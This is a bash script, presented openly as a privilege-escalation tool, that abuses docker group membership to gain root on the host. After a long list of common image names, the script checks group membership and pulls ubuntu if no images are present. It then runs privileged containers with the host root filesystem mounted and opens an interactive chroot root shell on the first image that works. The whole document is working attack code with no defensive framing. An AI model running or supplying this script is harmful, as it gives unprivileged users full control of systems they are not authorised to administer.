#!/bin/bash

# List of Docker images for privilege escalation
IMAGES=("python" "bash" "node" "sh" "golang" "openjdk" "php" "ruby" "dotnet/sdk" "rust" "swift" "erlang" "clojure" "perl"
"elixir" "haskell" "julia" "lua" "nimlang/nim" "racket/racket" "crystal" "kotlin" "scala" "dart" "groovy" 
"fsharp" "ziglang/zig" "mysql" "postgres" "mariadb" "mongo" "redis" "cassandra" "neo4j" "couchdb" "influxdb" 
"clickhouse" "cockroachdb/cockroach" "etcd" "memcached" "arangodb" "timescale/timescaledb" "dynamodb-local" 
"firebird" "h2database/h2" "oracle/database" "mssql/server" "percona/percona-server" "nginx" "httpd" "caddy" 
"traefik" "haproxy" "tomcat" "jetty" "varnish" "lighttpd" "gitlab/gitlab-ce" "jenkins/jenkins" "drone/drone" 
"sonarqube" "hashicorp/terraform" "gradle" "maven" "circleci/node" "concourse/concourse" "argoproj/argocd" 
"buildkite/agent" "buddy/buddy" "woodpecker-ci/woodpecker" "github/codespaces" "travisci/ci" 
"bitbucketpipelines/runner" "appwrite/appwrite" "bazel/bazel" "kubernetes/kubectl" "kindest/node" "rancher/k3s" 
"helm" "docker" "gcr.io/distroless/base" "quay.io/coreos/etcd" "k3d-io/k3d" "k9s" "falco" "istio/proxyv2" 
"cni-plugins" "calico/node" "weaveworks/weave-kube" "metallb/controller" "metasploitframework/metasploit" 
"wireshark" "zaproxy/zap" "nmap" "burp-suite" "sqlmapproject/sqlmap" "theharvester" "subfinder" "aquasecurity/trivy" 
"falco/falco" "gchq/cyberchef" "hashicorp/vault" "gophish/gophish" "ossec/ossec-hids" "lynis" "modsecurity" 
"bandit" "moby/vpnkit" "tor" "crowdsec/crowdsec" "whonix-gateway" "rabbitmq" "kafka" "nats" "activemq" 
"mosquitto" "emqx/emqx" "zeromq" "redpanda" "confluentinc/cp-kafka" "qpid" "prom/prometheus" "grafana/grafana" 
"loki" "fluentd" "elastic/elasticsearch" "vectorized/redpanda" "graylog/graylog" "telegraf" "logstash" 
"opensearchproject/opensearch" "datadog/agent" "tempo" "instana/agent" "influxdata/chronograf" 
"tensorflow/tensorflow" "pytorch/pytorch" "jupyter/base-notebook" "huggingface/transformers" "apache/spark" 
"rayproject/ray" "openvino/model_server" "nvcr.io/nvidia/cuda" "nvidia/dcgm-exporter" "mlflow/mlflow" 
"fastai/fastai" "opencv/opencv" "tritonserver/tritonserver" "kaggle/python" "rapidsai/rapidsai" "busybox" 
"alpine" "debian" "ubuntu" "archlinux" "centos" "fedora" "rockylinux/rockylinux" "almalinux/almalinux" "openwrt/rootfs" 
"kali/kali-rolling" "parrotsec/security" "photon/photon" "clearlinux" "nixos/nix" "windows/nanoserver" 
"tinycorelinux/tcl" "raspios/raspios" "amazonlinux" "google/cloud-sdk" "azure-cli" "openfaas/faas-cli" 
"fission/fission-bundle" "k3sup" "pulumi/pulumi" "rancher/rke2" "cloudflare/cloudflared" "ethereum/client-go" 
"parity/parity" "hyperledger/fabric-peer" "bitcoin/bitcoin" "ipfs/go-ipfs" "chia/chia" "monero-project/monero" 
"dashpay/dashd" "zcash/zcash" "steamcmd/steamcmd" "winehq/wine" "dolphin-emu/dolphin" "pcsx2/pcsx2" 
"openmw/openmw" "scummvm/scummvm" "mame/mame" "citra/citra" "homeassistant/home-assistant" "esphome/esphome" 
"balena/raspberrypi3" "nodered/node-red" "eclipse/mosquitto" "teslamate/teslamate" "lxd/lxd" "openhab/openhab" 
"jupyterhub/jupyterhub" "apache/flink" "nexmo/api" "redislabs/rejson" "cloudfoundry/cf-cli" "jetbrains/idea" 
"postgrest/postgrest" "diginc/dockerfiles" "v2tec/watchtower" "wazuh/wazuh" "utserver/utorrent" "emby/embyserver" 
"plexinc/pms-docker" "mysql/mysql-server" "geerlingguy/docker-ubuntu-vagrant" "highscalability/highscalability" 
"homl/libreoffice" "owncloud/server" "nextcloud/server" "postgresql/postgresql-operator" "docker/compose" 
"mythtv/mythtv" "jupyter/scipy-notebook" "microk8s/microk8s" "openjdk/jdk" "hyperledger/fabric-orderer" 
"influxdata/influxdb" "openfaas/gateway" "rabbitmq/management" "heimdallproject/heimdall" "corvus-charts/corvus" 
"harbor/harbor-core" "mailu/mailu" "home-assistant/ingress" "squid/squid" "jackc/pgx" "data61/katana" "java/jdk" 
"stellar/stellar-core" "matrixdotorg/synapse" "nginx/unit" "jupyterhub/helm-chart" "devtron-labs/devtron" 
"getredash/redash" "apache/kafka" "vitalikethics/eth2-cypher" "nvidia/jetson-containers" "weather-app/weather-app" 
"concourse/worker" "kubernetes/pause")

# Check if the current user is in the docker group
if ! groups | grep -q "\bdocker\b"; then
    echo "[!] You are not in the docker group."
    exit 1
fi

# Get a list of locally available images
AVAILABLE_IMAGES=$(docker images --format "{{.Repository}}" | grep -Ev "^<none>$")

if [ -z "$AVAILABLE_IMAGES" ]; then
    echo "[!] No Docker images found locally. Attempting to pull ubuntu..."
    docker pull ubuntu >/dev/null 2>&1
    AVAILABLE_IMAGES=$(docker images --format "{{.Repository}}" | grep -Ev "^<none>$")
    if [ -z "$AVAILABLE_IMAGES" ]; then
        echo "[!] Failed to pull Ubuntu. Exiting."
        exit 1
    fi
fi

# Attempt privilege escalation with available images
for IMAGE in "${IMAGES[@]}"; do
    if echo "$AVAILABLE_IMAGES" | grep -qw "$IMAGE"; then
        echo "[+] Found image: $IMAGE"
        echo "[+] Testing privilege escalation..."
        # Check if the image has 'chroot' and can execute it
        if docker run --rm --privileged -v /:/mnt "$IMAGE" sh -c "chroot /mnt /bin/sh -c 'exit 0'" >/dev/null 2>&1; then
            echo "[!] Success! Executing privileged shell with $IMAGE..."
            docker run --rm -it --privileged -v /:/mnt "$IMAGE" chroot /mnt /bin/sh
            exit 0
        else
            echo "[-] Privilege escalation failed with $IMAGE. Trying next image..."
        fi
    fi
done

echo "[!] No suitable images found for privilege escalation."
exit 1
